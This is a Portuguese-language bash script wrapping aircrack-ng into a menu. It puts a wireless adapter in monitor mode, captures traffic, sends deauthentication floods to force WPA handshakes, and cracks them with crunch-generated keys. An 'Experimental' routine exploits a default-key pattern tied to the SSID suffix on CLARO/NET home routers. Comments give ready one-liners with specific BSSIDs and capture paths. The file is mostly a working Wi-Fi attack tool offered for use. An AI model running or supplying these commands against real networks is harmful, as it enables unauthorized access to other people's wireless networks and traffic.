#!/bin/bash 2> /dev/null 
## By Luís Fernando da Silva Adão [ApologiaLinux]
## Divirtam-se, com responsabilidade crianças! ;)
## Antigo, mas atualizado em 26/02/2022
##12/03/2022 Incluindo opção DesfazerEspecifico para, quando necessário, rodar airmon-ng apenas para colocar interface especifica em multicast.
# Text Modes
bold=$(tput bold) # Negrito
# Text format reset
txtrst=$(tput sgr0) # Text reset
# Text color
txtred=$(tput setaf 1) # Vermelho
txtgrn=$(tput setaf 2) # Verde
txtblu=$(tput setaf 4) # Azul	
txtylw=$(tput setaf 3) # Amarelo
txtpur=$(tput setaf 5) # Purpura
clear
## cat << Algolegal 
##Algolegal
sleep 2 
clear
Principal() {
  echo
  echo  ${txtgrn}
  echo ${bold}${txtpur}"    AIRCRACK-NG E FERRAMENTAS"${txtrst}
  echo "-----------------------------------------"
  echo ${bold}${txtgrn}"Install aircrack-ng tools          [ 1 ]${txtrst}"
  echo ${txtylw}"Colocar adaptador em modo monitor  [ 2 ]${txtrst}"
  echo ${txtred}"Capturar tráfego*                  [ 3 ]${txtrst}"
  echo ${txtblu}"Forçar handshakes*                 [ 4 ]${txtrst}"
  echo ${txtpur}"Captura vs WORDLIST*               [ 5 ]${txtrst}"
  echo ${txtgrn}"Restaurar modo do adaptador        [ 6 ]${txtrst}"
  echo ${txtgrn}"Desfazer Modo do adaptador ESP     [ 7 ]${txtrst}"
  echo ${txtblu}"Experimental (Claro/Net)           [ 8 ]${txtrst}"
  echo ${bold}"Sair                               [ 9 ]${txtrst}"
  echo "-----------------------------------------"
  echo -n "Qual o passo desejado (1,2,3,4,5,6,7 ou 8)? "
  read opcao
  case $opcao in
    1) Install;;
    2) Airmon;;
    3) Airodump;;
    4) Aireplay;;
    5) Aircrack;;
    6) Desfazer;;
    7) DesfazerEspecifico;;
    8) Experimental;;
    9|s|S|0|q|Q|Sair|sair) exit;;
    ajuda|h|help|H) ajuda;;
    *) "Opção desconhecida. Erro"; Principal ;;
  esac
}
ajuda() {
 ## Este comando com o parametro -e abre o xterm como comando que segue.
  xterm -e 'echo "Em desenvolvimento"; sleep 5' 2> /dev/null &
 
Principal

}
Install() {
  ## Necessário verificar se o aircrack já esta instalado
  if [ ! -f /usr/bin/aircrack ]
    then 
       ## Instala repositórios para o Aircrack-NG por apt-get
       echo '## AIRODUMP
  deb http://ppa.launchpad.net/pi-rho/security/ubuntu precise main
  deb-src http://ppa.launchpad.net/pi-rho/security/ubuntu precise main' >> /etc/apt/sources.list
  	apt-get update -y
  	apt-get install aircrack-ng -y
  fi
  Principal
  
}

Airmon() {
  echo -n "Qual o adaptador wireless (wlan0,wlan1,etc)?"
  read wlanX
  wlanX=$(echo "${wlanX:="wlan0"}")
  airmon-ng start "$wlanX" 1
  monX1=$(ifconfig | grep wlan | sed -e 's/://g' | awk '{print $1}')
  monX=$(echo "${monX:=$monX1}")
  airmon-ng start "$monX"
  airodump-ng "$monX"
  
  Principal
  ## Ver comando "ip link set wlan0 promisc on"
  ## Usar variáveis globais
  ## Em caso de existir uma única placa, apenas informar 
}

Airodump() {
  ## Este processo deve ser rodado simultaneamente em um terminal separado.
  echo -n "Qual BSSID do AP de atuação (11:22:33:44:55:66)?"
  read bssidX
  monX="wlan0mon"
  monX1=$(ifconfig | grep wlan | sed -e 's/://g' | awk '{print $1}')
  monX=$(echo "${monX:=$monX1}")
  channelX= $(airodump-ng "$monX" | grep $bssidX | awk '{print $1}') 
  airodump-ng --bssid "$bssidX" -c "$channelX" --write WPAcrack.cap
  
  Principal
  ## Poderia ser escolhido em uma lista
}

Aireplay() {
  ## Este processo deve ser rodado simultaneamente em um terminal separado.
  aireplay-ng --deauth 100 -a "$bssidX" "$monX"
  
  Principal
  ## Abrir automaticamente
}

Aircrack() {
  ## Este processo deve ser rodado em um terminal separado. Ressalto que usa muito processamento mas, uma vez existindo o arquivo de captura, pode ser rodado a qualquer momento. Por esta razão, é interessando rodá-lo como: nice -n 9 "comando"
  echo -n "Nome completo do arquivo WPAcrack.cap?"
  read wpacrackX
  echo -n "Arquivo WORDLIST usado para comparação?"
  read wordlistX
  echo -n "Qual o final do nome?"
  read possivel
  echo "crunch 8 8 ABCDEF1234567890 -t @@"$possivel" | aircrack-ng "$wpacrackX" --bssid "$bssidX" -w-"
  
  Principal
  ## Crunch em conjunto com o aircrack: crunch 8 8 abcdefghijklmnopqrstuvxz 1234567890 | aircrack --bssid 00:1D:AA:9D:27:AC -w- 'root/handshakes/Cafelocuraceb-00:1D:AA:9D:27:AC.cap 
  
  ##Abrir automaticamente e sem necessidade de usar wordlist, apenas com o crunch ou wordlist nativo do Kali
  # crunch 8 8 ABCDEF0132456789 -t @@6157F6 (sendo o nome da rede CLARO_2G6157F6)  e o comando para acesso ao roteador (usuário padrão NET_6154F6) crunch 12 12 ABCDEF0132456789 -t @@@@@@6157F6  
  ###  crunch 8 8 abcdefghijklmnopqrstuvxwyz1234567890 -t @@@@@@@@ | aircrack-ng /run/live/persistence/sdc2/rw/home/kali/hs/handshake_XXXX.cap --bssid 60:3D:26:5D:62:0F -w-

  
}

Desfazer() {
  airmon-ng stop  "$wlanX"
  airmon-ng stop "$monX"
  ## ifconfig "$WIFIMON" down
  rm -v WPAcrack*

  Principal
  ## Ser rodado automaticamente ao final da execução do crunch
  ## Remover variáveis globais
}

DesfazerEspecifico() {
  wlanEspec1=$(ifconfig | grep wlan | sed -e 's/://g' | awk '{print $1}')
  echo -n "Qual o adaptador wireless ($wlanEspec1,wlan0,wlan1,etc)?"
  read wlanEspec
  wlanEspec=$(echo "${wlanEspec:=$wlanEspec1}")
  airmon-ng stop  "$wlanEspec"
  #airmon-ng stop "$monX"
  ## ifconfig "$WIFIMON" down

  ##Para ser usado quando a interface que estiver em PROMISCUO, em Muticast novamente.
  
Principal

}

Experimental() {
 ## Este comando com o parametro -e abre o xterm como comando que segue.
  #xterm -e wifite --wpa ; sleep 30  &
  echo "Digite o nome"
  read nome01
  arquivo01=$(ls /run/live/persistence/sdc2/rw/home/kali/hs/*.cap | grep .*"$nome01"*.)
  echo "$arquivo01" | cut -d "_" -f "2"  
  sleep 3
  if [ -f "$arquivo01" ]
    then 
      #cor7=$txtgrn
      #n7="OK"
      bssid01=$(echo "$arquivo01" | cut -d "_" -f "3" | sed -e 's/-/:/g')
      finalMac01=$(echo "$bssid01" | cut -d ":" -f "4-6" | sed -e 's/://g')
      finalClaro01=$(echo "$arquivo01" | cut -d "_" -f "2"  | cut -c 8-13)
      finalNet01=$(echo "$arquivo01" | cut -d "_" -f "2"  | cut -c 6-11)
      #echo "Iniciando verificação no $arquivo01"
      if [ $(echo "$arquivo01" | cut -d "_" -f "2"  | cut -c 1-5 ) = "CLARO" ]
        then
          finalXXX="$finalClaro01"
        else
          finalXXX="$finalNet01"
      fi
      crunch 8 8 ABCDEF9876543210 -t @@"$finalXXX" | aircrack-ng "$arquivo01"  --bssid "$bssid01" -w- 
     sleep 20
     #cor7=$txtred
     #n7="NO"
     echo="Arquivo inexistente."
       
  fi
  
  Principal
  
}

Principal

